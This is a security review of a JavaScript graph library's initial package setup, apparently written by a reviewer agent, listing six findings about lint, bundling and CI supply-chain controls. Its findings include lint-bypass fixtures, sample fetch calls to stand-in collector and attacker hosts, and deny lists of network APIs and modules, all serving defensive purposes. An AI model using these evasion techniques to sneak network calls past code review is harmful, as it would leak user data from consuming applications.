# TICKET-001: Set up the package foundation and public repository — Security Review

## Summary

This review covers the package foundation delivered for `graph-library/component-packaging-and-source-export/TICKET-001` (branch `ticket/cpse-001`, commit `e4cc7e9`). The findings phase was run by the `security-reviewer` agent in a fresh context. The code ships no runtime logic yet: the four entry barrels are empty, `dist/` contains no network code, there are no runtime dependencies and the tarball holds only `dist/`, `LICENSE`, `README.md` and `package.json`. So prd/CC-001 and prd/CC-003 are met today. The weaknesses are in the controls that are meant to keep them met:
- The no-network lint rule can be bypassed in several ways, and nothing checks the built output.
- tsup inlines devDependencies, and neither the runtime-dependency check nor the lint rule looks at them.
- CI installs some tools and packages outside the lockfile, and it references actions by mutable tags.

Six findings: 0 Critical, 0 High, 2 Medium, 3 Low, 1 Informational.

**Files Reviewed:**
- `.github/workflows/ci.yml`
- `package.json`
- `pnpm-lock.yaml`
- `tsconfig.json`
- `tsup.config.ts`
- `eslint.config.js`
- `vitest.config.ts`
- `tests/setup/build.ts`
- `.size-limit.json`
- `src/index.ts`
- `src/core/index.ts`
- `src/tool/index.ts`
- `src/export/index.ts`
- `src/generated/schema.json`
- `src/generated/vocabulary.json`
- `scripts/check-dependencies.ts`
- `scripts/check-changesets.ts`
- `.changeset/changelog.cjs`
- `.changeset/changelog.d.cts`
- `.changeset/config.json`
- `.changeset/README.md`
- `tests/package/boundaries.test.ts`
- `tests/package/node-entry.test.ts`
- `tests/package/checks.test.ts`
- `LICENSE`
- `README.md`
- `CONTRIBUTING.md`
- `.gitignore`

**Findings:** 6
**Critical:** 0 | **High:** 0 | **Medium:** 2 | **Low:** 3 | **Informational:** 1

## Security Assessment

### Input Validation

**Status:** Adequate
**Notes:** No runtime entry point exists yet, because `src/index.ts`, `src/core/index.ts`, `src/tool/index.ts` and `src/export/index.ts` all export nothing. The build, CI and test code that does exist handles its inputs safely:
- **`scripts/check-changesets.ts`:** reads contributor-controlled `.changeset/*.md` files.
  - Its front-matter regex is anchored at `^` without the `m` flag, so it matches from one start position and runs in linear time. There is no ReDoS risk.
  - It only ever prints the file path and a constant message, so a symlinked changeset cannot leak file contents.
- **`scripts/check-dependencies.ts`:** splits Markdown table rows and never evaluates or executes anything.
- **`.changeset/changelog.cjs`:** copies summary text into `CHANGELOG.md` as Markdown. GitHub and npm sanitise that Markdown when they render it, and nothing in this repository renders it as HTML.
- **`tests/package/node-entry.test.ts`:**
  - It spawns `process.execPath` through `execFileSync` with an argument array, so no shell is involved.
  - The `--eval` program is a constant, and the hook URL is embedded with `JSON.stringify`.
  - Temporary directories come from `mkdtempSync`, which uses a random suffix and mode 0700. Other local users therefore have no symlink or TOCTOU route into them.
  - The directories are never removed. They hold only constant hook code, so this has no security impact.
  - The hook URL is built as `` `file://${hooks}` `` rather than with `pathToFileURL`. On Windows, or when `TMPDIR` contains `#` or `?`, registration fails and the test fails. It fails closed, so this is a portability note for Quality Review, not a security issue.
- **`tests/setup/build.ts`:** runs `execFileSync("pnpm", ["build"])`, which takes no input and uses no shell.
- **CI:**
  - The workflow triggers on `pull_request`, not `pull_request_target`, and has no `workflow_run` trigger.
  - No attacker-controlled context (`github.head_ref`, `github.event.pull_request.*`) is interpolated into a `run:` step. The only expressions are the static `matrix.*` values and `github.ref` in the concurrency group.
  - Fork PR code does run, through the pnpm scripts and the ESLint, Vitest and tsup configs. That is inherent to `pull_request`, and it is contained by a read-only token and the absence of secrets (see SEC-006).

### Authentication & Authorization

**Status:** Adequate
**Notes:** The library has no authentication surface: no server, no accounts and no sessions. The CI token follows least privilege:
- The workflow-level `permissions: contents: read` covers the only job.
- Fork pull requests get a read-only token.
- No secrets are referenced, and there is no publish step, as the ticket's Notes require.
- `publishConfig.provenance: true` is set ahead of OIDC trusted publishing in TICKET-009.

One gap: `actions/checkout` persists the token in `.git/config` for the rest of the job (SEC-006).

### Data Protection

**Status:** Gaps Found
**Notes:** None of the reviewed files handle PII, credentials or logging.
- **Secrets:** a pattern scan of the commit (npm and GitHub tokens, AWS keys, private keys, `_authToken`, `password=`, `token=`) found nothing.
- **Tarball:** `npm pack --dry-run` lists 13 entries: `LICENSE`, `README.md`, `package.json` and `dist/**`. No `.gener8v/`, tests, scripts or lockfile are shipped (`files: ["dist"]`).
- **Built output:** the `dist/*.js` files are empty and contain no network tokens.
- **URLs in `src/`:** the only ones are the `$schema` and `$id` identifiers in `src/generated/schema.json`. They are identifiers that the package never fetches.

prd/CC-003 is therefore met by the delivered code. The gap is in the controls that are supposed to keep it met: the no-network rule can be bypassed and nothing checks the built output (SEC-001), and bundled third-party code escapes both checks (SEC-002).

### Configuration Security

**Status:** Gaps Found
**Notes:**
- **Secrets and defaults:** there are no hardcoded secrets, debug defaults or permissive settings.
- **Lockfile:** `pnpm-lock.yaml` is lockfile v9 with 368 resolutions. Every one has an `integrity` hash and comes from the default npm registry: no git, tarball or `file:` sources, and no project `.npmrc` overriding the registry.
- **Install scripts:** only `esbuild@0.27.7` and `esbuild@0.28.2` declare one (`postinstall`). pnpm 10 blocks lifecycle scripts by default, and `pnpm.onlyBuiltDependencies: ["esbuild"]` allows exactly that one package. `node_modules/.modules.yaml` records `ignoredBuilds: []`.
- **CI install:** uses `--frozen-lockfile`.
- **Gaps:**
  - pnpm and the React 18 matrix packages are installed outside the lockfile (SEC-003).
  - Actions are referenced by mutable tags (SEC-004).
  - The checkout and job defaults need hardening (SEC-006).
- **`.gitignore`:** does not list `.env*` or a project-level `.npmrc`. Neither file exists today. Adding them before TICKET-009 introduces release automation is cheap insurance (no finding).
- **Cryptography:** not applicable; the code does no cryptography.
- **Logging:** not applicable; the library logs nothing, and the scripts print only check results.

**Dependency audit:** `pnpm audit` (pnpm 10.28.2, Node.js v24.1.0), run 2026-10-05 13:12 UTC.
- Output: `1 vulnerabilities found — Severity: 1 low`. This is GHSA-g7r4-m6w7-qqqr in `esbuild@0.27.7`, reached through `tsup` and `vite`, both dev-only (SEC-005).
- `pnpm audit --prod`: `No known vulnerabilities found`. The package has no production dependencies.

**Compliance cross-reference (prd constraints):**

| Constraint | Result |
|---|---|
| prd/CC-001 (license) | Met: no runtime dependencies, no bundled assets, MIT `LICENSE` matches `package.json`. The control gap is SEC-002 |
| prd/CC-002 (WCAG) | Not applicable: no rendering code yet |
| prd/CC-003 (no data collection) | Met in the delivered code. The control gaps are SEC-001 and SEC-002 |
| prd/CC-004 (trademarks) | Not applicable: no images yet |

No CC-XXX violation was found, so no finding is raised to Critical.

## Findings

### SEC-001: No-network lint rule is easy to bypass, and nothing checks the built output

**Severity:** Medium
**Category:** Data Exposure
**OWASP Reference:** A06:2025 Insecure Design
**Location:**
- `eslint.config.js:17-35`: the no-network block; its glob, `src/**/*.{ts,tsx}`, is at line 19.
- `eslint.config.js:36-61`: the boundary block; its glob, `src/{core,tool,export,layout}/**/*.ts`, is at line 38.
- `tests/package/boundaries.test.ts:40-54`: tests only the five direct uses.

**Description:**
The control for CPSE-REQ-005 and prd/CC-003 uses two ESLint rules: `no-restricted-globals` and `no-restricted-properties`. These match only direct references to a global name and a few `object.property` pairs. They apply only to `src/**/*.{ts,tsx}`.

I ran 29 fixtures through the delivered config with ESLint's `lintText` API (no files written).

The rule caught four cases:
- `fetch`
- `globalThis.fetch`
- `globalThis["fetch"]`
- `const { sendBeacon } = navigator`

It missed every other case, and lint exited 0 on each:
- **Aliased or indirect access:**
  - `const g = globalThis; g.fetch(…)`
  - `self.fetch(…)`
  - `Reflect.get(globalThis, "fe" + "tch")`
- **Browser network APIs:**
  - `new Image().src = "https://…"` (a beacon)
  - `fetchLater(new Request(…))`
  - `new WebTransport(…)`
  - `new RTCPeerConnection()`
  - `new Worker("https://…")`
- **Remote resources in renderer output:**
  - JSX `<image href="https://…">`
  - a `<style>` with `@import url(https://…)`. CC-003's own rationale names remote images and fonts as forbidden.
- **Script loading:**
  - `document.createElement("script")` in the React renderer, where `document` is not restricted
  - `import("https://…")`, a remote dynamic import
- **Node.js network modules in `src/core`, `src/tool` and `src/export`:**
  - `node:https`, `node:http`, `node:net` and `node:dns`
  - `node:child_process` running `curl`
  - `undici`
- **Other file types:**
  - `fetch` in `src/core/*.js` and in `src/core/*.mts`
  - `src/**/*.jsx` files, which `eslint .` does not lint at all ("File ignored because no matching configuration")

I also built a scratch copy of the commit containing `src/core/net.js`, which calls `fetch("https://collector.example.test/?d=…")`, plus a sibling `net.d.ts`, imported from `src/core/index.ts`. `pnpm lint`, `tsc --noEmit` and `tsup` all exited 0, and the call was emitted into `dist/core/index.js`.

Nothing checks the built output, so anything the source-level rule misses is published. The acceptance criterion says the check "fails on any use of `fetch` … in `src/`". Aliased uses and uses in `.js` or `.mts` files pass.

**Attack Scenario:**
- **Attacker:** an outside contributor to the public repository.
- **What helps them:** `CONTRIBUTING.md:3-4` says the automated checks do most of the reviewing, and prd/OC-001 records that few people review.
- **Steps:**
  1. The attacker opens a plausible renderer PR, for example pictograph images or label fonts. It contains one of the bypasses: a pictograph `<image href="https://cdn.attacker.test/apple.svg">`, a "feature-detection" helper `const g = globalThis; g.fetch(…)`, or `import("https://…")`.
  2. CI is green, including the no-network rule that CPSE-REQ-005's `@spec` annotation points to.
  3. The maintainer trusts the check, merges the PR and releases.
- **Result:** every school application that renders a graph sends requests to the attacker's host. Those requests disclose the client IP, the `Referer` (page URLs can carry student or assignment identifiers) and usage timing. With a remote dynamic import, the attacker's code also runs in the consumer's page.
- **Same outcome without malice:** a later ticket's implementer adds a remote font or image.
- **Assumption:** human review is the only other control, and it misses the change.

**Impact:**
- prd/CC-003 is violated in a published version. Under prd/OC-003 that version can be deprecated but stays installable.
- Every consumer is pulled into FERPA/COPPA vendor data obligations.
- Usage data is disclosed to a third party.
- With a remote dynamic import, attacker script runs in consumer pages.

**Recommendation:**
1. Lint every source file type. Change the no-network block to `files: ["src/**/*.{ts,tsx,mts,cts,js,jsx,mjs,cjs}"]`, or reject non-TypeScript files under `src/` with a CI check (`git ls-files src | grep -vE '\.(ts|tsx|json)$'` must print nothing).
2. Ban the names that make aliasing possible, across all of `src/**`, with `no-restricted-globals`:
   - global-object aliases: `globalThis`, `self`, `window`, `frames`, `top`, `parent`
   - `document`; pure render functions (AD-014) never need it
   - network and loader APIs: `Image`, `Request`, `fetchLater`, `WebTransport`, `RTCPeerConnection`, `Worker`, `SharedWorker`, `importScripts`

   Keep the existing names.
3. Add `no-restricted-imports` over `src/**` for:
   - `node:http`, `node:https`, `node:http2`, `node:net`, `node:tls`, `node:dgram`, `node:dns`, `node:child_process`, `node:worker_threads`
   - the bare forms of those modules (`http`, `https`, and so on)
   - `undici`

   Better still, allow only relative imports and the React peer; this also closes SEC-002 at the source.
4. Add `no-restricted-syntax` for:
   - `ImportExpression`, which covers all dynamic imports
   - `JSXAttribute[name.name=/^(href|src|xlinkHref|ping)$/]` whose value is a literal or template starting with `http:`, `https:` or `//`
5. Add a backstop that does not depend on the syntax tree:
   - **Post-build scan:** after `pnpm build`, a CI step and test scans `dist/**/*.js` for the network API names, Node.js network module specifiers and absolute or protocol-relative URLs, with an explicit allowlist (for example, only the `$schema` and `$id` strings in `dist/schema.json`).
   - **Runtime test:** once runtime code lands, a test replaces `fetch`, `XMLHttpRequest`, `http.request`, `https.request` and `net.connect` with stubs that throw, then validates, exports and renders every example.
6. Add the bypass fixtures listed above to `tests/package/boundaries.test.ts` as cases the rule must reject.

**Compliance Impact:** prd/CC-003 is weakened: the control has gaps. The delivered code does not violate it, since it ships empty barrels. CPSE-REQ-005 is affected.
**Status:** Open

---

### SEC-002: Bundled code escapes the runtime-dependency check and the no-network lint

**Severity:** Medium
**Category:** Dependency
**OWASP Reference:** A03:2025 Software Supply Chain Failures
**Location:**
- `scripts/check-dependencies.ts:31-42`: `checkDependencies` reads only `pkg.dependencies` (line 36).
- `tsup.config.ts:7-30`: no restriction on what may be bundled; the `external` list is at line 23.

**Description:**
tsup 8.5.1 marks as external only what its `getProductionDeps` returns, which is `dependencies` plus `peerDependencies`. Any other package imported from `src/` is inlined into `dist/`, whether it is a devDependency or an `optionalDependencies` entry. Neither guard sees this code:
- `checkDependencies` (CPSE-NFR-007) counts only `dependencies`.
- The no-network lint (SEC-001) looks only at `src/`.

I demonstrated this in a scratch copy of the commit:
1. Added a devDependency, `phone-home`, whose code calls `globalThis.fetch("https://collector.example.test/v?x=…")`.
2. Imported it from `src/core/index.ts`.

Results:
- `pnpm lint` exited 0.
- `tsc --noEmit` exited 0.
- `check:deps` printed "Runtime dependencies: 0, all justified."
- `tsup` exited 0, and `dist/core/index.js` contained the package's `fetch` call verbatim.

Separately, some fields cause consumer-side installs without being checked:
- `optionalDependencies`
- `bundleDependencies` / `bundledDependencies`
- additional `peerDependencies`, which npm 7+ and pnpm auto-install

**Attack Scenario:**
- **Attacker:** an outside contributor, or whoever compromises a devDependency's publisher.
- **Steps:**
  1. A PR runs `pnpm add -D <useful-geometry-lib>`, which may be a typosquat or a later-compromised version, and imports it from `src/layout`.
  2. `dependencies` in `package.json` stays empty, so `check:deps` passes and the diff looks like a dev-only change.
  3. The library's code, including any telemetry or a non-MIT license, is inlined into the published `dist/` at the next release build.
- **Assumption:** the reviewer does not inspect the built bundle.

**Impact:**
- Third-party code ships without the license review that the runtime-dependency notes exist to enforce (prd/CC-001).
- It also ships without the network review (prd/CC-003).
- CPSE-NFR-007's CI check reports zero runtime dependencies while the bundle carries one.

**Recommendation:**
1. Make inlining impossible. In `tsup.config.ts`, mark every bare specifier as external (`external: [/^[^./]/]`), or add an esbuild plugin that fails the build when a resolved path lies inside `node_modules`.
2. Add a post-build check that the bare imports remaining in `dist/` are a subset of `peerDependencies ∪ dependencies`. For example, set `metafile: true` and assert that every key in the metafile's `inputs` is under `src/`.
3. Extend `checkDependencies` to `optionalDependencies`, `bundleDependencies` and `bundledDependencies`, and to every `peerDependencies` entry other than `react`. Add a failing-input test for each field in `tests/package/checks.test.ts`.
4. Lint `src/**` imports so that only relative paths and the React peer are allowed. Use a `no-restricted-imports` pattern, or `import-x/no-extraneous-dependencies` with `devDependencies: false` for `src/**`.

**Compliance Impact:** prd/CC-001 and prd/CC-003 are weakened: their controls have gaps. Neither is violated, since `dist/` currently contains no third-party code. CPSE-NFR-007 is affected.
**Status:** Open

---

### SEC-003: CI installs pnpm and the React 18 matrix packages outside the lockfile

**Severity:** Low
**Category:** Dependency
**OWASP Reference:** A03:2025 Software Supply Chain Failures
**Location:**
- `.github/workflows/ci.yml:31-32`: the pnpm install step.
- `.github/workflows/ci.yml:37-39`: the React 18 swap.
- `package.json`: has no `packageManager` field.

**Description:**
- **pnpm:** `npm install --global pnpm@10` installs whatever 10.x release is newest when the job runs, with no integrity pin. That is 10.34.6 on 2026-10-05, while the delivery was verified on 10.28.2.
- **React 18 cells:** these run `pnpm add --save-dev react@^18 react-dom@^18 @types/react@^18 @types/react-dom@^18`. That command resolves those packages and their dependencies afresh from the registry on every run, outside the integrity hashes that `--frozen-lockfile` enforces. `@types/react@^18` is still being published (18.3.31 at review time).
- **Mitigation already in place:** pnpm 10 still blocks the new packages' lifecycle scripts, because only esbuild is allowlisted. Their code runs only when tests import them, not at install.

**Attack Scenario:**
- **Attacker:** someone who compromises a pnpm, React 18 or `@types/react` publisher token and publishes a malicious patch release.
- **Result:** the next CI run executes the malicious release.
- **Limit in this workflow:** the job holds a read-only token and no secrets, and it publishes nothing. The impact is limited to CI compute and falsified check results.
- **Escalation:** the impact becomes High if `release.yml` (TICKET-009, `id-token: write`) copies this install pattern. A compromised tool could then publish with valid provenance.

**Impact:** At present, CI integrity only: checks could be forced green, or compute abused. In a release workflow, a malicious package could be published under the project's name.

**Recommendation:**
1. Pin pnpm by hash. Add `"packageManager": "pnpm@10.28.2+sha512.<hash>"` and install with `corepack enable`, which verifies the hash, or with `pnpm/action-setup` pinned by SHA, which reads `packageManager`.
2. Resolve the React 18 cells from committed, integrity-pinned resolutions. For example, commit a React 18 lockfile and install it with `--frozen-lockfile`.
3. At minimum, use exact versions (`react@18.3.1`, `@types/react@18.3.x`) together with pnpm's `minimumReleaseAge` (for example, 1440 minutes), so that freshly published versions are not taken.
4. At resolution, consider recording this as a Known Hazard on TICKET-009 so the release workflow does not inherit the pattern.

**Compliance Impact:** None
**Status:** Open

---

### SEC-004: GitHub Actions referenced by mutable tags, with no automated updates

**Severity:** Low
**Category:** Dependency
**OWASP Reference:** A03:2025 Software Supply Chain Failures
**Location:**
- `.github/workflows/ci.yml:25`: `actions/checkout@v5`
- `.github/workflows/ci.yml:27`: `actions/setup-node@v5`

**Description:**
- **Mutable tags:** both actions are referenced by a major-version tag. A tag can be moved by anyone with write access to the action's repository, or by an attacker who compromises it; the March 2025 `tj-actions/changed-files` incident retagged releases to exfiltrate secrets.
- **Lower risk here:** both actions are GitHub-owned, which makes them the lowest-risk case.
- **No update automation:** the repository has no `.github/dependabot.yml`, so neither actions nor npm devDependencies get automated update pull requests.

**Attack Scenario:**
- **Attacker:** someone who controls an action repository through a compromise, and moves its `v5` tag to malicious code.
- **Result:** that code runs in every matrix job with the checkout token, and alongside the PR code.
- **Limit in this workflow:** the token is read-only and there are no secrets, so the impact is falsified checks. It becomes significant once a workflow holds `id-token: write` (TICKET-009).

**Impact:** CI integrity now; the integrity of release provenance later.

**Recommendation:**
1. Pin each action to a full commit SHA, with the version as a comment (`actions/checkout@<40-char-sha> # v5.x.y`).
2. Add `.github/dependabot.yml` for the `github-actions` and `npm` ecosystems, so pins and devDependencies get reviewed update PRs.
3. When the repository is created, consider enabling the policy that requires actions to be pinned to a full-length SHA.

**Compliance Impact:** None
**Status:** Open

---

### SEC-005: Dev dependency esbuild 0.27.7 affected by GHSA-g7r4-m6w7-qqqr

**Severity:** Low
**Category:** Dependency
**OWASP Reference:** A03:2025 Software Supply Chain Failures
**Location:** `pnpm-lock.yaml:1099` (`esbuild@0.27.7`, pulled in by `tsup@8.5.1` and `vite@8.3.2`)

**Description:**
- **The advisory:** `pnpm audit` (2026-10-05) reports GHSA-g7r4-m6w7-qqqr, rated low. esbuild's development server (`serve` with `servedir`) normalises request paths with POSIX `path.Clean`. On Windows, backslash sequences therefore escape the served directory and allow arbitrary file reads. It is fixed in 0.28.1.
- **Why it is not reachable here:** esbuild is a dev-only dependency and is not shipped. The repository never starts esbuild's serve mode: tsup only builds, and Vitest uses the Node environment.

**Attack Scenario:** Not reachable as the repository is configured. Exploitation would need a developer to run `esbuild --serve`, with a `servedir`, on Windows, where an attacker could reach it.

**Impact:** None in current usage; theoretical file disclosure on a Windows developer machine if serve mode were ever used.

**Recommendation:** Update once `tsup` and `vite` accept esbuild ≥ 0.28.1, either with `pnpm update` or with a `pnpm.overrides` entry `"esbuild": "^0.28.1"` if the versions are compatible. Re-run the Verification Run afterwards. Otherwise, record it as a dev-only accepted risk.

**Compliance Impact:** None
**Status:** Open

---

### SEC-006: CI job hardening defaults (persisted checkout token, no timeout, repository settings)

**Severity:** Informational
**Category:** Misconfiguration
**OWASP Reference:** A02:2025 Security Misconfiguration
**Location:** `.github/workflows/ci.yml:16-25`

**Description:**
1. **Persisted token:** `actions/checkout` defaults to `persist-credentials: true`. It therefore writes the job's `GITHUB_TOKEN` into `.git/config`. Every later step can read it, and every later step runs PR-controlled code: pnpm scripts and the ESLint, Vitest and tsup configs.
2. **No timeout:** the job has no `timeout-minutes`, so the default of 360 minutes applies to each of the four matrix cells running fork code.
3. **Settings outside the workspace:** the GitHub repository does not exist yet (`TICKET-001/DEL-002`). Two protections live in its settings, not in this repository: the fork-PR rule "Require approval for all outside collaborators", and branch protection on `main` that makes the CI checks required.

**Attack Scenario:** N/A (Informational)

**Impact:**
- The persisted token is read-only on a public repository, so exposure is negligible today.
- Fork PRs could consume CI resources.
- Without required checks on `main`, the controls in SEC-001 and SEC-002 are advisory.

**Recommendation:**
1. Set `with: persist-credentials: false` on the checkout step. No later step needs git authentication; the freshness step only runs a local `git diff`.
2. Add `timeout-minutes: 20` to the job.
3. When the repository is created, require approval for workflows from outside collaborators, and make the CI matrix a required status check on `main`.

**Compliance Impact:** None
**Status:** Open

## Resolution Log

| Finding | Decision | Action Taken | Risk Accepted | File Updated |
|---------|----------|-------------|---------------|--------------|

## Verdict

**Result:** Approved with Notes
**Unresolved Critical/High:** 0
**Accepted Risks:** 0
**Notes:**
- **Provisional:** this verdict comes from the findings phase. The final verdict and any risk acceptances are decided at resolution with the user (steps 13–15).
- **Fix SEC-001 and SEC-002 first:** they should be fixed before any ticket adds runtime code under `src/`, and in any case before TICKET-009 publishes a release. Today the CC-003 and CC-001 guards would let a network call or an unreviewed third-party library reach `dist/` with CI green.
- **Fix SEC-003 and SEC-004 with or before TICKET-009:** the release workflow will hold `id-token: write`.
- **For Code Review:**
  - The acceptance criterion "fails on any use of `fetch` … in `src/`" is only partly met (see SEC-001).
  - The boundary block's `*.ts` glob does not cover `.tsx` files under `src/core`, `src/tool`, `src/export` and `src/layout`. In those files, importing `react` and using `document` both passed lint. Neither does the block catch `globalThis.document`. Those are prd/TC-005 gaps rather than security findings.
